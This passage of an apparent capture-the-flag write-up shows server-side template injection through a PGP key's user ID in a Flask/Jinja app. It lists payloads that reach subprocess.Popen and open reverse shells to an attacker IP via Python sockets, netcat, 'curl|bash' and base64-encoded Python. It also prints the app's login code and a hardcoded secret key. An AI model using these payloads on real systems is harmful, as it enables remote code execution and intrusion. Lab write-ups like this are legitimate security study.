+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>secret-message.txt.asc
+-----BEGIN<span class="w"> </span>PGP<span class="w"> </span>SIGNED<span class="w"> </span>MESSAGE-----
+Hash:<span class="w"> </span>SHA512
+
+Secret<span class="w"> </span>semechki<span class="w"> </span>stash<span class="w"> </span>location:<span class="w"> </span><span class="m">69</span>.10102232215594,<span class="w"> </span><span class="m">33</span>.44235905808057
+-----BEGIN<span class="w"> </span>PGP<span class="w"> </span>SIGNATURE-----
+
+iQGzBAEBCgAdFiEEPg7UBPww0B9W/AQl51qPOAcXE04FAmSycmUACgkQ51qPOAcX
+E057agwAldCZM7W+42eKiqbamDt7q7yObLM9fH7l6Sluc6EBmJdDmfFuj7BXgO0b
+Df5LyLC5b3V5uxwHozolJTb/0hywnCokaLRmAZc3R/wX+RrdH9xMAlqdHTzkAwzj
+EXfsD95sNhHD8MRMcom+R5EKeTPz+FR6jAw9V78Ebvos6DVrG8CO05KpHve0far3
+IpDVcMTW9vsxHanuGAbIvXqY/7Q8ENotSyZ+cybbrhNPuhlUJG+ZezqcpS6sqqe3
+9DDEkHmuRxx6KKCVxFuYfwdqdRRVzdWux9FoNz87/Ao1EExNNDnv37hVMS75MHL6
+17IgS7kHbOO68C8CMCdEOsNJdiWUGJ8jDjw/oxfgZfVZ+TPMRjvosRGuYmoAPbHg
+SRrb4hUHwRVfWfLxiDbj2K0KLCM6R/jlEDXl2S418zaVYDBeLsFP/ULigu2y8Ilc
+SzfQ2+Q+Zzz6D9ETq8KNXJovZqcnmvAYbJsz3PbiW64nAsYHSXojYrFjI4+sEj+Y
+<span class="nv">nJnpqg3f</span>
+<span class="o">=</span>stNp
+-----END<span class="w"> </span>PGP<span class="w"> </span>SIGNATURE-----
+</pre></div>
+</div>
+</section>
+<section id="ssti">
+<h2>SSTI<a class="headerlink" href="#ssti" title="Permalink to this heading">#</a></h2>
+<p>In the <code class="docutils literal notranslate"><span class="pre">Verfify</span> <span class="pre">Signature</span></code> section of <a class="reference external" href="https://ssa.htb/guide">https://ssa.htb/guide</a>, once provided with a valid Clearsign signature and the corresponding pub-key, the web-app returns a message parsed by the flask app, to confirm that the signature is valid. In that message we can see that the UID of the key is displayed, we control that UID since we created the key ourselves, and because this is Flask, The templating engine is likely Jinja, so, let’s try to do SSTI from the UID of the key.</p>
+<p>Generating a new key-pair with a name of {{ 7 * 7 }}</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--gen-key<span class="w">                          </span><span class="m">2</span><span class="w"> </span>⨯
+gpg<span class="w"> </span><span class="o">(</span>GnuPG<span class="o">)</span><span class="w"> </span><span class="m">2</span>.2.40<span class="p">;</span><span class="w"> </span>Copyright<span class="w"> </span><span class="o">(</span>C<span class="o">)</span><span class="w"> </span><span class="m">2022</span><span class="w"> </span>g10<span class="w"> </span>Code<span class="w"> </span>GmbH
+This<span class="w"> </span>is<span class="w"> </span>free<span class="w"> </span>software:<span class="w"> </span>you<span class="w"> </span>are<span class="w"> </span>free<span class="w"> </span>to<span class="w"> </span>change<span class="w"> </span>and<span class="w"> </span>redistribute<span class="w"> </span>it.
+There<span class="w"> </span>is<span class="w"> </span>NO<span class="w"> </span>WARRANTY,<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>extent<span class="w"> </span>permitted<span class="w"> </span>by<span class="w"> </span>law.
+
+Note:<span class="w"> </span>Use<span class="w"> </span><span class="s2">&quot;gpg --full-generate-key&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>full<span class="w"> </span>featured<span class="w"> </span>key<span class="w"> </span>generation<span class="w"> </span>dialog.
+
+GnuPG<span class="w"> </span>needs<span class="w"> </span>to<span class="w"> </span>construct<span class="w"> </span>a<span class="w"> </span>user<span class="w"> </span>ID<span class="w"> </span>to<span class="w"> </span>identify<span class="w"> </span>your<span class="w"> </span>key.
+
+Real<span class="w"> </span>name:<span class="w"> </span><span class="o">{{</span><span class="w"> </span><span class="m">7</span><span class="w"> </span>*<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="o">}}</span>
+Email<span class="w"> </span>address:
+You<span class="w"> </span>selected<span class="w"> </span>this<span class="w"> </span>USER-ID:
+<span class="w">    </span><span class="s2">&quot;{{ 7 * 7 }}&quot;</span>
+
+Change<span class="w"> </span><span class="o">(</span>N<span class="o">)</span>ame,<span class="w"> </span><span class="o">(</span>E<span class="o">)</span>mail,<span class="w"> </span>or<span class="w"> </span><span class="o">(</span>O<span class="o">)</span>kay/<span class="o">(</span>Q<span class="o">)</span>uit?
+Change<span class="w"> </span><span class="o">(</span>N<span class="o">)</span>ame,<span class="w"> </span><span class="o">(</span>E<span class="o">)</span>mail,<span class="w"> </span>or<span class="w"> </span><span class="o">(</span>O<span class="o">)</span>kay/<span class="o">(</span>Q<span class="o">)</span>uit?<span class="w"> </span>O
+We<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>generate<span class="w"> </span>a<span class="w"> </span>lot<span class="w"> </span>of<span class="w"> </span>random<span class="w"> </span>bytes.<span class="w"> </span>It<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>good<span class="w"> </span>idea<span class="w"> </span>to<span class="w"> </span>perform
+some<span class="w"> </span>other<span class="w"> </span>action<span class="w"> </span><span class="o">(</span><span class="nb">type</span><span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>keyboard,<span class="w"> </span>move<span class="w"> </span>the<span class="w"> </span>mouse,<span class="w"> </span>utilize<span class="w"> </span>the
+disks<span class="o">)</span><span class="w"> </span>during<span class="w"> </span>the<span class="w"> </span>prime<span class="w"> </span>generation<span class="p">;</span><span class="w"> </span>this<span class="w"> </span>gives<span class="w"> </span>the<span class="w"> </span>random<span class="w"> </span>number
+generator<span class="w"> </span>a<span class="w"> </span>better<span class="w"> </span>chance<span class="w"> </span>to<span class="w"> </span>gain<span class="w"> </span>enough<span class="w"> </span>entropy.
+We<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>generate<span class="w"> </span>a<span class="w"> </span>lot<span class="w"> </span>of<span class="w"> </span>random<span class="w"> </span>bytes.<span class="w"> </span>It<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>good<span class="w"> </span>idea<span class="w"> </span>to<span class="w"> </span>perform
+some<span class="w"> </span>other<span class="w"> </span>action<span class="w"> </span><span class="o">(</span><span class="nb">type</span><span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>keyboard,<span class="w"> </span>move<span class="w"> </span>the<span class="w"> </span>mouse,<span class="w"> </span>utilize<span class="w"> </span>the
+disks<span class="o">)</span><span class="w"> </span>during<span class="w"> </span>the<span class="w"> </span>prime<span class="w"> </span>generation<span class="p">;</span><span class="w"> </span>this<span class="w"> </span>gives<span class="w"> </span>the<span class="w"> </span>random<span class="w"> </span>number
+generator<span class="w"> </span>a<span class="w"> </span>better<span class="w"> </span>chance<span class="w"> </span>to<span class="w"> </span>gain<span class="w"> </span>enough<span class="w"> </span>entropy.
+gpg:<span class="w"> </span>revocation<span class="w"> </span>certificate<span class="w"> </span>stored<span class="w"> </span>as<span class="w"> </span><span class="s1">&#39;/home/blnkn/.gnupg/openpgp-revocs.d/1A8F692F3DA436FF0E8119FE550AF70682324573.rev&#39;</span>
+public<span class="w"> </span>and<span class="w"> </span>secret<span class="w"> </span>key<span class="w"> </span>created<span class="w"> </span>and<span class="w"> </span>signed.
+
+pub<span class="w">   </span>rsa3072<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="o">[</span>SC<span class="o">]</span><span class="w"> </span><span class="o">[</span>expires:<span class="w"> </span><span class="m">2025</span>-07-14<span class="o">]</span>
+<span class="w">      </span>1A8F692F3DA436FF0E8119FE550AF70682324573
+uid<span class="w">                      </span><span class="o">{{</span><span class="w"> </span><span class="m">7</span><span class="w"> </span>*<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="o">}}</span>
+sub<span class="w">   </span>rsa3072<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="o">[</span>E<span class="o">]</span><span class="w"> </span><span class="o">[</span>expires:<span class="w"> </span><span class="m">2025</span>-07-14<span class="o">]</span>
+</pre></div>
+</div>
+<p>Exporting the pubkey to a text file</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--output<span class="w"> </span>ssti-pub.gpg<span class="w"> </span>--export<span class="w"> </span>--armor<span class="w"> </span>1A8F692F3DA436FF0E8119FE550AF70682324573
+</pre></div>
+</div>
+<p>Clearsigning a message with that key</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;{{ 7 * 7 }}&#39;</span><span class="w"> </span>--clearsign<span class="w"> </span>secret-message.txt
+File<span class="w"> </span><span class="s1">&#39;secret-message.txt.asc&#39;</span><span class="w"> </span>exists.<span class="w"> </span>Overwrite?<span class="w"> </span><span class="o">(</span>y/N<span class="o">)</span><span class="w"> </span>y
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>secret-message.txt.asc
+-----BEGIN<span class="w"> </span>PGP<span class="w"> </span>SIGNED<span class="w"> </span>MESSAGE-----
+Hash:<span class="w"> </span>SHA512
+
+Secret<span class="w"> </span>semechki<span class="w"> </span>stash<span class="w"> </span>location:<span class="w"> </span><span class="m">69</span>.10102232215594,<span class="w"> </span><span class="m">33</span>.44235905808057
+-----BEGIN<span class="w"> </span>PGP<span class="w"> </span>SIGNATURE-----
+
+iQGzBAEBCgAdFiEEGo9pLz2kNv8OgRn+VQr3BoIyRXMFAmSyg2MACgkQVQr3BoIy
+RXOolgv/Y+FEb+EpL9Mf8GBKfwm/L4th6CZh7oHM0LPPnJmt8OJwH76Lyf2fYtpN
+StmUZWhe4vqZb1hDjxojRqFgZp22WYAs9v0ujl9X/KvyBoGzPvfWP/ReZp37TIl0
++YbhEJ/kWPoxyua9jUrW6fXMIuBby58zzSvzuq9DEUsFrdrITz5Ag8IPjZ+tPcd9
+OXvpeJyKWjddCNzNgSrifFTRxKHUCVrIJCuzwoOudjM5478R6csT2PBrm5BCVvZ6
+38TE3oMeV9TsDAuesjeRfBrNWUsFhegDWZbtyP7unfcmKmoPmHYSAcbv12gZ1KUc
+LILUFVY0MFmcb/TXgHsVvTYolVcbDVb1eXcKb9NHkFSOU1bZ7S16VwOQHQ1o2NEo
+GW7fFHDR3oF3dcAtJqZ2oz1t7tBf4i4Q/1a4hlpXigtNtxHtBGor3ORuWBpwK4D4
+8c02Fse1ZXYiFedEL6s21sJMO1IlGaBppG9ZKiwacFphKrLAkomgAKWhzOJZ04Pu
+lRS+E90s
+<span class="o">=</span>3TWE
+-----END<span class="w"> </span>PGP<span class="w"> </span>SIGNATURE-----
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--verify<span class="w"> </span>secret-message.txt.asc
+gpg:<span class="w"> </span>Signature<span class="w"> </span>made<span class="w"> </span>Sat<span class="w"> </span><span class="m">15</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">12</span>:30:43<span class="w"> </span>PM<span class="w"> </span>IST
+gpg:<span class="w">                </span>using<span class="w"> </span>RSA<span class="w"> </span>key<span class="w"> </span>1A8F692F3DA436FF0E8119FE550AF70682324573
+gpg:<span class="w"> </span>Good<span class="w"> </span>signature<span class="w"> </span>from<span class="w"> </span><span class="s2">&quot;{{ 7 * 7 }}&quot;</span><span class="w"> </span><span class="o">[</span>ultimate<span class="o">]</span>
+gpg:<span class="w"> </span>WARNING:<span class="w"> </span>not<span class="w"> </span>a<span class="w"> </span>detached<span class="w"> </span>signature<span class="p">;</span><span class="w"> </span>file<span class="w"> </span><span class="s1">&#39;secret-message.txt&#39;</span><span class="w"> </span>was<span class="w"> </span>NOT<span class="w"> </span>verified!
+</pre></div>
+</div>
+<p>And there is an SSTI indeed:
+<img alt="ssti.png" src="../../../../_images/ssti.png" /></p>
+<p>Trying to find the index of subprocess.Popen with slicing, and then tried a few things to get a shell</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">0</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()}}</span>
+<span class="mi">1</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">200</span><span class="p">:]}}</span>
+<span class="mi">2</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">400</span><span class="p">:]}}</span>
+<span class="mi">3</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">500</span><span class="p">:]}}</span>
+<span class="mi">4</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">450</span><span class="p">:]}}</span>
+<span class="mi">5</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">420</span><span class="p">:]}}</span>
+<span class="mi">6</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">445</span><span class="p">:]}}</span>
+<span class="mi">7</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">448</span><span class="p">]</span><span class="o">.</span><span class="vm">__name__</span><span class="p">}}</span>
+<span class="mi">8</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">449</span><span class="p">]</span><span class="o">.</span><span class="vm">__name__</span><span class="p">}}</span>
+<span class="mi">9</span>  <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">447</span><span class="p">]</span><span class="o">.</span><span class="vm">__name__</span><span class="p">}}</span>
+<span class="mi">10</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">300</span><span class="p">:]}}</span>
+<span class="mi">11</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">435</span><span class="p">:]}}</span>
+<span class="mi">12</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">440</span><span class="p">:]}}</span>
+<span class="mi">13</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">438</span><span class="p">:]}}</span>
+<span class="mi">14</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">]</span><span class="o">.</span><span class="vm">__name__</span><span class="p">}}</span>
+<span class="mi">15</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+<span class="mi">16</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s2">&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\&quot;</span><span class="s2">10.10.14.52</span><span class="se">\&quot;</span><span class="s2">,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(</span><span class="se">\&quot;</span><span class="s2">sh</span><span class="se">\&quot;</span><span class="s2">)&#39;&quot;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+<span class="mi">17</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s1">&#39;nc 10.10.14.52 4242 -e sh&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+<span class="mi">18</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s1">&#39;which nc&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+<span class="mi">19</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s2">&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\&quot;</span><span class="s2">10.10.14.52</span><span class="se">\&quot;</span><span class="s2">,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(</span><span class="se">\&quot;</span><span class="s2">sh</span><span class="se">\&quot;</span><span class="s2">)&#39;&quot;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+<span class="mi">20</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s2">&quot;pwd&quot;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+<span class="mi">21</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s2">&quot;curl http://10.10.14.52:9090/notashell.sh|bash&quot;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+<span class="mi">22</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s2">&quot;printf &#39;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjUyIiw0MjQyKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKQ==&#39;|base64 -d|python3&quot;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+</pre></div>
+</div>
+<p>Once I got a shell, I could explore the app so see how the login works so that we can access that admin portal maybe?</p>
+<p>in <code class="docutils literal notranslate"><span class="pre">app.py</span></code></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nd">@main</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/login&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">))</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;login.html&quot;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;login&quot;</span><span class="p">)</span>
+
+    <span class="n">uname</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+    <span class="n">pwd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+
+    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">uname</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">user</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">check_password_hash</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="n">pwd</span><span class="p">):</span>
+        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Invalid credentials.&#39;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;main.login&#39;</span><span class="p">))</span>
+
+    <span class="n">login_user</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">remember</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;main.admin&#39;</span><span class="p">))</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">models.py</span></code></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">.</span><span class="w"> </span><span class="kn">import</span> <span class="n">db</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask_login</span><span class="w"> </span><span class="kn">import</span> <span class="n">UserMixin</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">User</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">,</span> <span class="n">UserMixin</span><span class="p">):</span>
+    <span class="n">__tablename__</span> <span class="o">=</span> <span class="s1">&#39;users&#39;</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">100</span><span class="p">))</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">1000</span><span class="p">))</span>
+
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">__init__.py</span></code></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask_login</span><span class="w"> </span><span class="kn">import</span> <span class="n">LoginManager</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask_sqlalchemy</span><span class="w"> </span><span class="kn">import</span> <span class="n">SQLAlchemy</span>
+
+<span class="n">db</span> <span class="o">=</span> <span class="n">SQLAlchemy</span><span class="p">()</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">create_app</span><span class="p">():</span>
+    <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+    <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;91668c1bc67132e3dcfb5b1a3e0c5c21&#39;</span>
